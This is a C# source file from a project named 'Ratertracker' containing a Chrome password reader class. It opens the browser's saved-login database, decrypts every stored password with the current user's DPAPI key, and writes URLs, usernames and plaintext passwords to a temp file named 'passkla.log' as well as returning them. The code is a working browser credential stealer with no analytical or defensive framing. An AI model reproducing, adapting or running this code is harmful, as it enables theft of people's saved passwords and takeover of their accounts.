using System;
using System.Data.SQLite;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace Ratertracker
{
    class Chrome : IPassReader
    {
        public string BrowserName { get { return "Chrome"; } }

        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";


        public IEnumerable<CredentialModel> ReadPasswords()
        {
            var result = new List<CredentialModel>();
            string filePath = Path.Combine(Path.GetTempPath(), "passkla.log");
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
            var p = RadForm1.monText.ToString();
            // var p = "C:\\something.txt";



            if (File.Exists(p))
            {
                File.AppendAllText(filePath, "PASSWORD" + System.Environment.NewLine);

                using (var conn = new SQLiteConnection($"Data Source={p};"))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                        using (var reader = cmd.ExecuteReader())
                        {

                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                    File.AppendAllText(filePath, "Url : " + reader.GetString(0) + System.Environment.NewLine + "User : " + reader.GetString(1) + System.Environment.NewLine + "Pass : " + pass + System.Environment.NewLine);

                                    result.Add(new CredentialModel()
                                    {
                                        Url = reader.GetString(0),
                                        Username = reader.GetString(1),
                                        Password = pass
                                    });
                                }
                            }
                        }
                    }
                    File.AppendAllText(filePath, result.ToString());
                    conn.Close();
                }

            }
            else
            {
                //throw new FileNotFoundException("Canno find chrome logins file");
            }
            return result;
        }

        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }
    }
}
